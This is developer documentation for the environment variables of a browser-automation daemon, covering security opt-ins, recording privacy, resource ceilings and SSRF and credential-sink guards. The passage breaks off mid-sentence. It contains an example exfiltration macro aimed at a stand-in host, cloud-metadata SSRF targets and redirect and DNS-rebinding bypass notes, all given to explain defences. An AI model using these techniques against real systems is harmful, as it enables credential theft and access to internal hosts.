# Environment variables

Extracted from the root `AGENTS.md`. All defaults live in
`src/octowright/defaults.py` (several knobs keep their parser elsewhere because
that module is at its LOC ceiling -- each entry names the parser).

A plain numeric knob (a timeout, a count, a port) that does not parse --
`OCTOWRIGHT_NAV_TIMEOUT_MS=30s`, a blank value -- falls back to its default with
one `octowright.defaults.env_invalid` warning instead of raising at import,
which used to stop every command, the stdio follower included. Parsers:
`defaults.env_int` / `defaults.env_float`. Knobs listed below with their own
parser keep that parser's rules.

Key vars (the rest are under [Other knobs](#other-knobs) below):
- `OCTOWRIGHT_HTTP_PORT` — HTTP dashboard port (default 6286, auto-bumps if busy)
- `OCTOWRIGHT_HTTP_HOST` — HTTP dashboard bind host (default 127.0.0.1)
- `OCTOWRIGHT_ALLOW_REMOTE_DASHBOARD` — set to `1` (or `true`/`yes`/`on`; see the opt-in parse below) to allow non-loopback access to sensitive dashboard/MCP endpoints. **Warning:** there is no auth layer; combining a non-loopback `OCTOWRIGHT_HTTP_HOST` with this flag exposes RCE-equivalent surface (the MCP transport drives browsers) to the network. Use only behind your own auth gateway.
- **Capability opt-ins parse strictly.** `OCTOWRIGHT_ALLOW_REMOTE_DASHBOARD`, `OCTOWRIGHT_ALLOW_PY_SCENARIOS`, `OCTOWRIGHT_ALLOW_SHELL_CRED_CMDS`, `OCTOWRIGHT_ALLOW_ARBITRARY_CRED_CMDS` and `OCTOWRIGHT_ALLOW_EXECUTABLE_PATH` are **OFF by default** and turn on **only** for `1`/`true`/`yes`/`on` (case-insensitive, surrounding whitespace ignored). Unset, empty or an explicit no (`0`/`false`/`no`/`off`/`never`/`none`/`disabled`) is off silently; **any other value stays off** and logs one `octowright.defaults.opt_in_unrecognized` warning naming the variable. This is the same rule as the OFF-by-default timeout knobs below (a typo must not silently turn a default-OFF knob on), and it matters more here: each of these widens what the daemon may do, and the three `defaults.py` flags used to share `_parse_bool_env`, which reads anything outside `0`/`false`/`no`/`off` as ON -- so `OCTOWRIGHT_ALLOW_PY_SCENARIOS=` (empty) or `=maybe` enabled `.py` scenario code execution. `OCTOWRIGHT_ALLOW_EXECUTABLE_PATH` had the same fail-open with its own token set; `OCTOWRIGHT_ALLOW_REMOTE_DASHBOARD` failed closed but accepted only the literal `1`. Parser: `defaults.opt_in_enabled`. What each one gates:
  - `OCTOWRIGHT_ALLOW_PY_SCENARIOS` — load `.py` scenario files, which run arbitrary Python at import (`scenarios.load_scenario`).
  - `OCTOWRIGHT_ALLOW_SHELL_CRED_CMDS` — let a persona credential `*_cmd` invoke a shell with `-c` (`bash -c "..."`).
  - `OCTOWRIGHT_ALLOW_ARBITRARY_CRED_CMDS` — let a persona credential `*_cmd` run an executable that is not on the well-known credential-helper allowlist.
  - `OCTOWRIGHT_ALLOW_EXECUTABLE_PATH` — accept `executable_path` / `launch_args` on the live `browser_launch` path (arbitrary binary and argv spawned by the daemon).
  - Default-ON knobs parsed by `_parse_bool_env` (`OCTOWRIGHT_CRASH_RECOVERY`, `OCTOWRIGHT_HTTP_METRICS`) are unchanged: only a falsey token disables them.
- `OCTOWRIGHT_DEFAULT_URL` — override the URL opened on `browser_launch` with no `url` argument (default resolves from the bound port at runtime; always points at `/new-tab` on the local daemon)
- `OCTOWRIGHT_VIEWPORT_W` / `OCTOWRIGHT_VIEWPORT_H` — default viewport width/height (**1280 / 800**), also the size of every `octowright test` browser and its video. Read at import, so an unusable value -- not an integer (`1920px`, blank) or not positive (`0`, `-5`) -- falls back to the default with an `octowright.defaults.viewport_invalid` warning rather than crashing every command with a traceback, as a bare `int()` did. Parser: `defaults._parse_viewport_dim`.
- `OCTOWRIGHT_DEFAULT_LABEL` — override the auto-detected default browser label (see `.octowright/config.yaml` for per-project configuration)
- `OCTOWRIGHT_BADGE_OPACITY` — corner badge opacity (float 0.0–1.0, default 0.35). Lower = more translucent.
- `OCTOWRIGHT_DISABLE_GPU` — launch **Chromium** with `--disable-gpu --disable-gpu-compositing`. **OFF by default.** An escape hatch for the recurring headed-Chromium crash characterised as a deterministic main-process CHECK abort reached through native macOS UI plus the Metal GPU path (Chrome 148 / macOS 26; the same signature is confirmed on Chromium 151, and the abort lands at browser **close**). **Honest scope: this is not a confirmed fix.** The crash's trigger is characterised; this mitigation has not been proven to prevent it, and the reason is worth knowing before anyone assumes it was tested and failed: until 2026-09-07 nothing could reproduce the crash on demand, so there was never a baseline to A/B the knob against. It exists so an operator whose browsers are crashing has something to try in one argument. Per-launch override with `browser_launch(disable_gpu=…)`, which outranks the env var in both directions. Deliberately a boolean over a fixed flag set rather than more `launch_args`: arbitrary argv is gated behind `OCTOWRIGHT_ALLOW_EXECUTABLE_PATH` (a code-execution opt-in), far too heavy a door to open just to turn the GPU off mid-incident, whereas a boolean grants no new power and needs no gate. Chromium-only — Firefox/WebKit would be handed argv they don't understand. Note it does **not** remove WebGL: Chromium falls back to SwiftShader software rendering (measured). Resolver: `browser_pool.options.resolve_disable_gpu`.
- `OCTOWRIGHT_WAYLAND_NATIVE` — run **headed Chromium on Linux** as a native Wayland client (`--ozone-platform=wayland --enable-features=WaylandWindowDecorations`) instead of an X11 client under XWayland. It exists because XWayland drops touchpad pinch gestures: in the field, a page-side logger saw **zero** wheel/touch/pointer events while pinching in an Octowright window, while the user's own Chrome on the same GNOME/Wayland machine pinch-zoomed fine. **Tri-state, default AUTO (unset).** `1`/`true`/`yes`/`on` forces it on, `0`/`false`/`no`/`off` (also `never`/`none`/`disabled`) forces it off, unset/empty/`auto` is auto. **Any other value is treated as auto** with one `octowright.wayland.env_unrecognized` warning per value -- the repository rule that an unrecognised value means the default, and auto is the safe reading here because it applies Wayland only where a compositor socket exists and falls back to X11 when that launch fails. Auto turns it on only when **all** hold: Linux, Chromium, headed, `WAYLAND_DISPLAY` set, and the socket it names exists (an absolute `WAYLAND_DISPLAY` is the socket itself; a relative one is joined to `XDG_RUNTIME_DIR`, and with no `XDG_RUNTIME_DIR` auto stays off). Whatever the source, it is never applied to headless, Firefox/WebKit, or a non-Linux host. Per-launch override with `browser_launch(wayland_native=…)`, which outranks the env var in both directions; `wayland_native=True` is refused for Firefox/WebKit and off Linux. **Fallback:** only AUTO retries a failed Wayland launch once without the flags (X11) and reports it in the launch result (`wayland_native.reason: "fallback_x11"`, `fallback_reason`, and a `wayland_warning` string); an explicit `True` or `=on` fails loudly instead, since quietly serving the X11 window it asked not to get is an option the caller believes took effect. The retry happens inside one launch, so engine health records one outcome. Merges rather than clobbers `--enable-features`: Chromium honours only the last one, and Playwright already passes `--enable-features=CDPScreenshotNewSurface` (unless `PLAYWRIGHT_LEGACY_SCREENSHOT` is set), so the switch Octowright adds carries Playwright's feature and any caller `launch_args` features too. Deliberately a fixed flag set rather than `launch_args`, for the `OCTOWRIGHT_DISABLE_GPU` reason: no new power, so no `OCTOWRIGHT_ALLOW_EXECUTABLE_PATH` gate. `octowright_status()["defaults"]["wayland_native"]` reports the setting and what it means for a headed Chromium launched now. Resolver: `browser_pool.wayland.resolve_wayland_native`.
- `OCTOWRIGHT_HEADLESS` — force headless mode
- `OCTOWRIGHT_DAEMON_READY_TIMEOUT` — seconds a spawned daemon gets to bind and answer HTTP before the caller gives up (**default 10**). Also settable per-invocation with `octowright serve --ready-timeout`, which exports this var so every `wait_for_daemon()` in the process (including the post-bridge respawn) shares one budget. It matters because exceeding it is not a hard failure: `cli/serve` falls back to running the leader **inline** (`inline_reason="daemon_spawn_failed"`), which is fragile — a cold container running `uv run octowright serve` routinely needs more than 10s and lands there by default. Unparsable / non-positive / non-finite values fall back to the default rather than hanging or never waiting; `--ready-timeout` **refuses** such a value with a `UsageError` instead, since the flag would otherwise be silently floored back to the default while the caller believed it took effect. Parser/const: `daemonize.daemon_ready_timeout` / `DAEMON_READY_TIMEOUT_SECONDS`.
- `OCTOWRIGHT_IDLE_GRACE` — seconds the idle pool waits before the daemon auto-exits. **Unset/off by default**; a positive number opts in. Rationale + disable tokens: **Idle Watchdog** in [AGENTS.md](../AGENTS.md).
- `OCTOWRIGHT_PROFILES_DIR` — override profile storage root
- `OCTOWRIGHT_MACROS_DIR` — override macro JSON storage root
- `OCTOWRIGHT_ADVISOR_STATE` — override the local Advisor state JSON path (preferences, bounded tool usage, macro observations)
- `OCTOWRIGHT_UPGRADE_STATE` — override the last-seen-version marker path used by the post-upgrade "what's new" notice (see the post-upgrade "what's new" notice section in [AGENTS.md](../AGENTS.md))
- `OCTOWRIGHT_MACRO_SLOWMO_MS` — default per-action delay during macro replay (0 disables); also applies to every macro `octowright test` runs
- `OCTOWRIGHT_PROFILE` — comma-separated capability-profile names to slim the LLM tool surface; unset or `all` registers everything (see **Capability Profiles** in [AGENTS.md](../AGENTS.md))
- `OCTOWRIGHT_PLUGINS` — comma-separated **entry-point names** of the session-kind plugins this daemon loads. **Nothing loads by default.** Installing a distribution that declares an `octowright.session_kinds` entry point only makes it *discoverable*; an operator has to enable it by name, because a transitive dependency must not be able to silently extend a browser-driving daemon. Resolution order: this variable wins; then a `plugins:` list in `config_paths.user_config_dir() / "plugins.yaml"`; then nothing. Deliberately **not** `.octowright/config.yaml` — that file is found by walking up from CWD, so enabling plugins there would make the MCP tool surface depend on which directory the daemon happened to be spawned in (the same class of surprise as `octowright restart` ignoring `--http-port`). The project config keeps doing what it does today (`label`, `persona`, `profile`): per-project defaults, not capability grants. An enabled name with no matching entry point is reported at `octowright_status()["plugins"]` as `state: "missing"` rather than failing silently. A plugin whose scenario adapter does not match the contract is **refused at load** the same way, with the offending method named: capability support is derived by `isinstance` against `runtime_checkable` Protocols, which tests attribute *presence* and nothing else — not arity, not keyword names, not whether the method is a coroutine — so an adapter carrying a sync `run_macro`, or one taking different keywords, was registered as supporting `macros` and failed with a `TypeError` from core's own call site partway through someone's scenario, read as a scenario failure rather than the plugin defect it is. `plugins.contract.contract_errors` checks each claimed capability (and the mandatory `ScenarioAdapter` floor, which nothing asserted before) by *binding* the call shape the Protocol declares against the implementation's signature, so it tracks the Protocol instead of mirroring it by hand, and an implementation stays free to rename positional parameters — core passes those by position and never names them. Parser: `octowright.plugins.discovery.enabled_names`.
- `OCTOWRIGHT_TAIL_POLL_SECONDS` / `OCTOWRIGHT_TAIL_HEARTBEAT_SECONDS` — WS `/tail` poll interval and quiet-stream keepalive cadence (defaults 1.0 / 15.0)
- `OCTOWRIGHT_DASHBOARD_DISCONNECT_POLL_SECONDS` / `OCTOWRIGHT_DASHBOARD_HEARTBEAT_SECONDS` — SSE `/api/dashboard/events` disconnect-detection cadence and keepalive interval (defaults 0.05 / 15.0)
- `OCTOWRIGHT_REDACT_INPUTS` — record-time scrubbing of user-typed values (`type_text` / `fill`) in the per-session JSONL stream. `off` records the literal value (leaks secrets to anyone reading `/api/sessions/{id}/events`), `passwords` (DEFAULT) replaces values typed into `<input type="password">` — *and* `<input type="text">` carrying `autocomplete=current-password`, `new-password`, or `one-time-code` (the SPA-custom-password-input case) — with `<redacted:password>` while the page still receives the real value, `all` redacts every typed/filled value regardless of element type. `all` additionally scrubs the **selector-less sinks** that carry no inspectable field — `press_key` (key), `evaluate` (expression), `select_option` (value/label), and `set_dialog_policy`'s `prompt_text` (in both its `set_dialog_policy` and `dialog_handled` rows, and in the tool's result) — via `_redact_sink_value`; `off`/`passwords` leave those raw (they key off element type and can't classify a selector-less value). The **same policy** now also governs accessibility-tree snapshots — see **Accessibility-snapshot credential scrubbing**. This is the record-time companion to the save-time `macros/lint.py` credential check — the linter only fires when an operator saves a recording as a macro, so unless this is set the JSONL on disk still contains the cleartext password. Under `passwords` or `all`, a value typed into a field positively classified as a password (not merely one `all` hides, and not one whose probe failed) also joins the session privacy ledger (`macros.privacy.admit_redacted_input`), because the page may echo it: later recording rows, the live console/network buffers, the websocket sidecar, the markdown cache and captures are scrubbed of it as a whole identifier, the page-derived fields of macro failure payloads anywhere, and the session's screenshots then follow `OCTOWRIGHT_LEDGER_SCREENSHOTS`. See **Argument privacy** in [macros.md](macros.md). <!-- pragma: allowlist secret (redaction-policy prose, not a credential) -->
- `OCTOWRIGHT_RECORDINGS_PRIVATE` — owner-only permissions for recordings **and the artifact roots**. **ON by default** (an empty value still means on; only an explicit falsey token — `0`/`off`/`false`/`no`/`never`/`none`/`disabled` — widens it). `recorder.Recorder` `chmod`s each JSONL to `0600` and its parent to `0700` so a local user can't read recorded input/URLs/credentials out-of-band. The same knob now locks `CAPTURES_DIR`, `GOLDENS_DIR` and `MACROS_DIR` to `0700` via `private_paths.secure_artifact_tree`, called from `captures.save_capture`, `goldens.save_golden` and `macros/storage`. Those hold the same class of data — page text, accessibility trees, `evaluate` results, and (since `browser_network_requests` began recording them) request headers — but sat at `0755` while recordings and profiles were already locked, so the protection was inconsistent rather than absent. **The directory is the control, not the file mode**, and not as a stylistic preference: `_paths.atomic_write_text` deliberately *preserves* an existing target's mode, because an atomic write must be a content replacement and not a silent permission change — so a golden first written at `0644` before that helper existed keeps `0644` through every later rewrite, forever (observed on a real goldens dir). A `0700` directory denies traversal and covers every file inside regardless of age or mode. Captures nest as `root/host/session`, so the whole tree is walked and the walk is containment-checked first — a leaf outside the configured root is locked on its own rather than chmod-ing unrelated parents on the way up. Best-effort throughout: a failing `chmod` never blocks a capture, golden save, or macro write. See **Recording-file privacy**.
- `OCTOWRIGHT_RECORDING_MAX_BYTES` — per-recording JSONL byte ceiling (disk-fill DoS guard). **ON by default at 512 MiB** (`recorder.RECORDING_MAX_BYTES_DEFAULT`). It was off (unbounded), but the rows are page-driven -- console output, websocket previews, network echoes -- so a remote page logging in a loop could fill the recordings disk from one open tab; 512 MiB is hours of an ordinary session many times over. Once the file would exceed it `recorder.Recorder` stops appending, writing a single `recording_truncated` marker (carrying `limit_bytes`/`bytes_written`) so replay/export/discovery see the cut; a reopened recording counts the bytes already on disk before deciding. The browser keeps working; only that file stops growing. A positive byte count sets the ceiling; `0` or a falsey token (`off`/`false`/`no`/`never`/`none`/`disabled`) removes it (unbounded). An **unparsable or negative value falls back to the default, not to unbounded** -- a typo must not silently remove a disk guard. The parser lives in `recorder._recording_max_bytes`, mirroring how `incidents`/`health` keep their own `OCTOWRIGHT_*` knobs. Independently of this ceiling, each console row's text is capped at `CONSOLE_TEXT_MAX_CHARS` (16,000, `session/_constants.py`) before it is recorded -- the prefix is kept with `text_truncated`/`text_length` -- so one page-logged multi-megabyte string cannot cost its full size per call even under the ceiling.
- `OCTOWRIGHT_NETWORK_BODY_MAX_BYTES` — bytes of a **failed** response body retained per recorded network row. **ON by default at 2048.** A recorded row carried url/method/status/failure and no body, so a failing request was recoverable only as its status code — the same thing the console already prints — and a 409 from one endpoint can have eight distinct causes. The refusal reason (`{"detail": "component_allocation_required"}`) is already on the wire and is usually the entire diagnosis; without it the browser stops being the tool and becomes the obstacle, which is what a field report described after two sessions on two wrong hypotheses. Captured only for **non-2xx** responses (successful bodies are large, numerous and rarely interesting, so an ordinary page pays nothing) that are **same-origin** with the page (a third party's response is not the caller's to collect), and capped, with `body_truncated` flagged. A falsey token (`0`/`off`/`false`/`no`/`never`/`none`/`disabled`) disables capture; an unparsable or negative value falls back to the **default, not to off** — this is a diagnostic that is on by default and a typo must not silently remove the field that explains a failure (the opposite fallback from `OCTOWRIGHT_OPERATION_ACTIVE_TIMEOUT_SECONDS`, which is off by default and must not be silently turned on). **The read is eager, and it has to be:** measured against Chromium, a body requested after the page has navigated away fails with `Protocol error (Network.getResponseBody): No resource with given identifier`, so a lazy read at tool-call time would return nothing exactly when someone is investigating a failure. It is scheduled as a background task from the `response` event handler (an already-registered `event-critical` gate bypass) and mutates the row in place; a body that cannot be read leaves the row exactly as it was rather than raising in a detached task. Same-origin is compared against the session's own `url` field rather than a live `page.url` read, since the handler must not touch Playwright state — it can lag a navigation the tools did not drive, which costs a body we could have kept, never one we should not have. **Honest scope:** values are NOT redacted, unlike headers — a body has no name to classify on. The non-2xx + same-origin + size scoping is what bounds the exposure, and an application error body from the app under test is a different thing from a request header carrying a live bearer. Parser: `session/core_network_mixin.network_body_max_bytes`. Separately, a body whose declared `Content-Length` exceeds `RESPONSE_BODY_READ_MAX_BYTES` (1 MiB) is **not read at all** (`body_skipped: "too_large"`, `body_size`), because `response.body()` materialises the whole body before this cap slices it. **A body is read only when its decoded size is bounded before the read**, because Playwright has no ranged or streaming read: a body with no, or an unparsable, `Content-Length` (chunked) is **not read** (`body_skipped: "unknown_length"`) -- it used to be read whole, which let a hostile same-origin endpoint answer 500 with an endless chunked stream and have it materialised in the leader. `Content-Length` counts *encoded* bytes, so a compressed body is read only for gzip/deflate declared at or under `COMPRESSED_BODY_READ_MAX_BYTES` (~1 KiB, since those formats cannot expand past ~1032:1 and so stay under the 1 MiB read ceiling); brotli, zstd and anything else are not read (`body_skipped: "encoded"`) because a few hundred bytes of them can decode to gigabytes. At most `RESPONSE_BODY_READS_IN_FLIGHT_MAX` (8) reads run per session; a failure arriving while that many are pending is `body_skipped: "busy"`. The trade: a chunked or brotli-compressed error body no longer carries its diagnostic -- the status and headers still do.
- `OCTOWRIGHT_TAIL_MAX_BYTES` — bytes `recorder.tail_log` reads in ONE call (memory guard for the read side of the same file the ceiling above bounds on the write side). **ON by default at 8 MiB** -- far below the 512 MiB write ceiling, because every caller (`browser_tail_recording`, `http/discovery.get_events`, `ScenarioPool.tail`) already loops on the returned cursor, so a window costs a round trip rather than correctness — whereas an unbounded `fh.read()` let one `?since=0` on a long-lived recording pull the whole file into the leader (the process owning every live browser) and then multiply it by parsing each line into a dict. A falsey token (`0`/`off`/`false`/`no`/`never`/`none`/`disabled`) or a non-positive/unparsable value restores the unbounded read. Parser: `recorder._tail_max_bytes`. **Oversized-line note:** a single JSONL line longer than the window contains no newline, and the pre-existing "no newline means a partial trailing line, wait" branch would then freeze the cursor and return nothing on every poll forever. `recorder._cursor_past_unterminated_window` separates the two cases — step over an oversized line (logging `octowright.recorder.tail_line_too_large`), hold still for a genuine partial write. The length check that distinguishes them is load-bearing: the recorder appends concurrently, so scanning ahead on a short read could pick up bytes written after it and skip a line that was only mid-write.
- `OCTOWRIGHT_SESSION_LIST_SNAPSHOT_MAX` — recordings past which `GET /api/sessions` stops snapshotting its assembled closed-session listing (**default 50,000**). The listing walks every recording in the directory. A per-file LRU cannot serve that walk: a corpus larger than the cache makes the sequential scan evict its own earliest entries and finish holding only the tail, so the next request restarts at the head and misses on everything but that tail. Sizing an LRU past the corpus only moves the cliff, so the listing keeps one directory's worth instead — replaced rather than grown on each rebuild, so it cannot creep the way a raised cap would. Measured on a real 10,177-recording directory: ~9,600 re-opened files and 2.8s per call, warm or cold, and three consecutive calls timed at 2.78 / 2.85 / 2.59s — flat, because the cache never warmed. `http/discovery._summaries_for` therefore keeps its own per-directory snapshot keyed on the directory mtime (what changes when a recording is added or removed; appending to an existing one does not touch it, and need not, since a summary is built from the opening row and that is fixed for the file's lifetime). A rebuild carries forward every summary whose `(mtime_ns, size)` is unchanged, so adding one recording re-reads one file. The snapshot is REPLACED rather than grown on each rebuild, so unlike an LRU with a raised cap it cannot creep; this ceiling exists only so a pathological corpus cannot turn the cache into memory pressure in the process that also owns every live browser. Above it the listing still works, uncached. Non-positive / unparsable falls back to the default. Const: `http/discovery.SESSION_LIST_SNAPSHOT_MAX`.
- `OCTOWRIGHT_MAX_REQUEST_BODY_BYTES` — route-level HTTP request-body ceiling. **OFF by default** (unbounded). A positive byte count rejects a larger JSON body with `413` before it is fully materialized: `http/routes/_common._read_body_capped` checks `Content-Length` early and streams+counts so a lying/absent length can't bypass it. Falsey (`0`/`off`/`never`/`none`/`disabled`/`false`/`no`) / unparsable / non-positive keeps it off. Parser: `http/routes/_common._max_request_body_bytes`.
- `OCTOWRIGHT_WEBSOCKET_MAX_BYTES` — per-session WebSocket sidecar byte ceiling (disk-fill DoS guard for a firehose page). **ON by default at 256 MiB** (`session/core_io_mixin.WEBSOCKET_MAX_BYTES_DEFAULT`); it was off, which let a remote page's socket pushing frames forever fill the recordings disk. The ceiling stops appending recorded frames to the `.websocket.cache.jsonl` sidecar once it would exceed the limit, writing a single `websocket_truncated` marker (carrying `limit_bytes`/`bytes_written`) so inspection sees the cut. The browser and the socket keep working. A positive byte count sets it; `0` or a falsey token removes it; an unparsable or negative value falls back to the default, not to unbounded. Parser: `session/core_io_mixin._websocket_max_bytes`. A frame is measured **before** it is copied, base64-encoded or serialised, so one that cannot fit is refused without paying for it. Whether or not a ceiling is set, one frame's stored payload is capped at `WEBSOCKET_FRAME_MAX_BYTES` (256 KiB, `session/_constants.py`); the row keeps the true `payload_size` and sets `payload_truncated`.
- `OCTOWRIGHT_SSRF_POLICY` — opt-in block of `http(s)` navigation to non-public hosts. **OFF by default**. `off` performs no host check; `block-private` refuses navigation to a *literal* IP in any non-public range (loopback, link-local **including the `169.254.169.254` cloud-metadata range**, RFC1918, the RFC 6598 shared space `100.64.0.0/10` -- Alibaba's `100.100.100.200` metadata service and Tailscale -- and anything else `ipaddress` does not call global, multicast, reserved, unspecified) and to `localhost` / `*.localhost` / well-known metadata hostnames. A URL Python's `urlsplit` cannot parse is refused too, because a browser may still accept it and read a different host (`http://x]@169.254.169.254/` is userinfo `x]` on the metadata address). Enforced in `octowright.ssrf.check_navigation_url`, called from the shared `_reject_unsafe_url` guard so it covers `browser_navigate` / `browser_open_url` / `browser_launch` **and macro/recording replay** — and the context's `base_url`, which the same guard validates so a host-relative macro can't inherit an origin the policy would refuse (see **Host-relative navigation**). Without it, a real browser plus the read tools (`browser_read_markdown` / `browser_snapshot` / `browser_evaluate`) can exfiltrate cloud-metadata credentials and reach internal hosts — including by a *poisoned macro*. Redirects **are** covered: `ssrf_guard.install_navigation_guard` fetches every navigation once itself, checks each hop, and serves the page only the response it validated -- a redirect becomes a client redirect that comes back through the guard -- so a server cannot answer the check one way and the browser another (see **Per-hop redirect checking**). **Subresource URLs are covered too**: every image/script/`fetch`/XHR and every WebSocket to a literal non-public IP, a refused name, or a hostname resolving to a non-public address is aborted (hostnames resolved once per host per 30s). **A subresource's redirect is not re-checked**: a first hop the policy allows that answers `302 -> private` is followed by firefox and webkit (a blind SSRF -- the request is made, the page cannot read the answer); Chromium currently refuses it through its own Local Network Access check, not this guard. Closing it would break CORS, streaming and `credentials: 'omit'` for every page (see **Per-hop redirect checking**); use network-layer egress control where that matters. A redirect to a non-http(s) `Location` (`javascript:`, `data:`, `blob:`, `file:`) is refused. **Hostnames are resolved**: the async `check_navigation_url_resolved` (tool pre-flight and every hop the guard checks, including a page-started navigation's own URL) looks up a non-allowlisted name with `getaddrinfo` off the event loop and refuses it if **any** answer is non-public. **A name that does not resolve is refused** (fail closed) under `block-private` -- an offline or split-horizon host must be named in `OCTOWRIGHT_SSRF_ALLOW`, which is never resolved. What it cannot close: the browser does its own lookup when it connects and Playwright cannot pin the validated address, so a rebinding DNS server that answers public then private (TTL 0) still wins that race; use network-layer egress control where that matters. A non-GET navigation's redirect is checked too, and a `307`/`308` on a form POST is refused. Under the policy a redirecting navigation's `goto` reports the client-redirect document's `200`, not the 3xx chain (see **Per-hop redirect checking**). An *unrecognized* value fails safe to `block-private` (the operator clearly meant to enable a policy).
- `OCTOWRIGHT_SUPPRESS_RESTORE_PROMPT` — clear a Chromium profile's crash flag before opening it, so a relaunch does not open behind "Chrome didn't shut down correctly -- Restore pages?". **ON by default**; an empty value still means on, and only an explicit falsey token (`0`/`off`/`false`/`no`/`never`/`none`/`disabled`) opts out. Chromium records the previous run's outcome in `<user-data-dir>/<profile>/Preferences` as `profile.exit_type`, and the flag is **sticky** — it is rewritten only when a run of that same profile exits cleanly, which an agent-driven browser frequently never does. Octowright is a reliable source of dirty exits (the headed Chromium 153 first-download crash — see `OCTOWRIGHT_PRUNE_DOWNLOAD_HISTORY` —, `octowright restart`'s SIGKILL, the orphan reaper), so one crash prompts on every later launch of that persona: 2 of a real machine's 27 profiles were sitting at `Crashed` when this was written. It is not cosmetic. The bubble covers the page the caller just navigated to, and clicking it is worse than leaving it — see the untracked-page gap below. `--hide-crash-restore-bubble` is deliberately not used: arbitrary argv reaches `launch_args`, gated behind `OCTOWRIGHT_ALLOW_EXECUTABLE_PATH` (a code-execution opt-in, far too heavy a door for a prompt), and it would only hide the bubble while leaving the profile marked crashed. Persistent profiles only — an ephemeral session gets a fresh user-data-dir with no previous run to have crashed. Chromium-only in effect: Firefox and WebKit profiles contain no file of that name (verified), so the glob finds nothing. Best-effort; a profile that cannot be read or written is logged and left alone. Parser/module: `browser_pool.restore_prompt`.

  **The untracked-page gap it also closes.** `context.on("page", ...)` fires only for pages created *after* it is registered, and a context can be handed back already holding pages. Measured against real Chromium with three seeded tabs and restore on: the relaunched context returned **four pages at handback and fired zero page events**. Octowright seeds `session.pages` with the single page it picked, so those restored tabs were invisible to `page_list`, unreachable by `page_switch`, and unwired for dialogs, downloads, console and network — inside a session it otherwise believes it fully owns. `listeners.adopt_untracked_pages` (called from `launch_publish`, deliberately **after** the `page` registrations so a page created in the gap is caught by one or the other) adopts them through the existing popup path rather than repeating its wiring, recording `adopted_page` instead of `popup_opened` because a tab Chromium restored is not a popup. That kind is classified `_REPLAY_PASSIVE`; an unclassified recorder event is counted as a replay *error*. The same probe run against firefox and webkit returned one blank page each, so neither restores and neither is affected. **The handback ORDER is a race, and it is closed.** It is not stable — two runs of the same probe put `about:blank` first, then third — and Octowright took `context.pages[0]` as its main page and navigated it, so with the suppression opted out a restored tab's content could be overwritten. `launch_helpers.select_launch_page` picks the page to navigate instead of assuming the first one is ours. A context handing back **one** page returns it untouched whatever its URL — Chromium's initial page is not always `about:blank` (the new-tab override extension replaces it), so testing blankness there would open a spurious second page on every launch. Only a multi-page handback takes the other path, and even then nothing is closed or navigated over: with no blank page to spare it opens a new one. A page whose URL cannot be read counts as NOT blank — it is closing or unhealthy, and the safe direction is to leave it alone rather than elect it as the one about to be navigated.

- `OCTOWRIGHT_PRUNE_DOWNLOAD_HISTORY` — delete a Chromium profile's download-history rows (`downloads`, `downloads_url_chains`, `downloads_slices` in `<profile>/History`; browsing history untouched) before every launch. **ON by default**; an empty value still means on, and only an explicit falsey token (`0`/`off`/`false`/`no`/`never`/`none`/`disabled`) opts out. Chrome for Testing 153.0.8010.12 (`chromium-1243`, what Playwright 1.63 — and so a fresh `octowright` install — resolves to) kills its own **browser process** with a use-after-free SIGSEGV on the first download of a headed run whenever `History` holds a download row at startup and Playwright controls downloads (`accept_downloads=True`, always set). Measured with raw Playwright: 7/7 blob downloads, 5/5 server attachments, 5/5 blob navigations crashed with one prior row; 0/6 with the rows deleted; never headless, never with `accept_downloads=False`, never on `chromium-1234`. Through `BrowserPool` on 1243: 27/27 relaunches crashed with this off, 0/30 (90/90 downloads) with it on. It must run per launch because Chromium re-inserts the rows from its own download DB during startup (the re-inserted rows are harmless — `chrome://downloads` keeps its list). Every row points at a deleted `playwright-artifacts-*` temp file anyway; Octowright's saved copy is under the recordings root. Same guards as the restore-prompt repair — never while the singleton lock survives the stale-lock prune, best-effort (an unreadable/corrupt/locked `History` is logged and left alone) — but a wider scope: every persistent Chromium user-data-dir, a `profile` **and** a `session=True` tmpdir (reused per label for the daemon's lifetime, so it carries rows into the next launch, including the relaunch after this crash; its stale lock is pruned first for that reason). Runs in a worker thread, awaited before the browser starts. Parser/module: `browser_pool.download_history`.
- `OCTOWRIGHT_PROFILES_PRIVATE` — owner-only permissions (`0700`) on persona/profile directories. **ON by default.** A profile dir holds live session cookies, `localStorage`, and IndexedDB for every site the persona logged into — a strictly stronger credential than the typed password `OCTOWRIGHT_RECORDINGS_PRIVATE` already protects. Chromium hardens its own profile root; **Firefox and WebKit do not** (observed: `cookies.sqlite` at `0644` inside an `0755` tree), so on a shared host another local user could copy a logged-in session straight off disk. The directory mode is the control — it denies traversal and so covers every file the engine creates inside, without Octowright chasing per-file modes it doesn't own. `browser_pool.launch_helpers` locks the engine profile dir at launch and `personas.create_persona` locks a new persona dir; the walk goes up to `PROFILES_DIR` and stops (a leaf outside that root is locked on its own and the walk halts, so an unexpected `OCTOWRIGHT_PROFILES_DIR` can't chmod its way to `/`). Best-effort: a failing `chmod` never blocks a launch. Falsey token (`0`/`off`/`false`/`no`/`never`/`none`/`disabled`) opts out. Parser/helpers: `octowright.private_paths`.
- `OCTOWRIGHT_MACRO_CREDENTIAL_SINKS` — refuse to expand a credential-named macro arg into a field that leaks it. **ON by default** (`block`). `{"action": "navigate", "url": "https://evil.test/?p={{password}}"}` is an ordinary macro shape, so a poisoned or shared macro could exfiltrate a caller-supplied secret; `evaluate` hands it to page JS instead. The sink set is `url`/`expression`/`verify_js`/`grabbed_predicate_js`/`headers`/`body`/`paths`/`prompt_text` (`CREDENTIAL_UNSAFE_KEYS`) -- `verify_js`/`grabbed_predicate_js` are code sinks an action supplies its own JS to, which `a11y_dragdrop` did; `headers` (inject_headers, set_extra_http_headers, mock_route) rides every matching request, and inject_headers' `pattern` can name an attacker's host; mock_route's `body` is served to the page and is code for a script request; an upload's `paths` entry becomes the filename the server receives; `set_dialog_policy`'s `prompt_text` is `prompt()`'s return value for whichever page next calls it, on any origin, and the policy outlives the step and the run -- and nested lists/dicts inside a sink inherit it so the value can't be laundered through a container. **Refusing a placeholder in a sink is not enough on its own**, because page code needs no placeholder to read a credential the macro typed: a constant `evaluate` that installs an `input` listener before a credential `fill` on the session's own origin, or a constant `expect_js` that reads the field back after it, sends the value wherever it likes. So a run that expands a credential-tier arg anywhere -- a typed `value`, a header, a `macro_call`'s `args`, at any depth -- also refuses every step that runs page code (`evaluate`, `expect_js` and `wait_for` with an `expression`, `a11y_dragdrop`'s `verify_js`/`grabbed_predicate_js`, and a `mock_route` `body`, which the page runs when it answers a script or document request), before the fill or after it: up front for every step the run reaches whenever it gets that far (top-level steps, a `try`'s steps, a 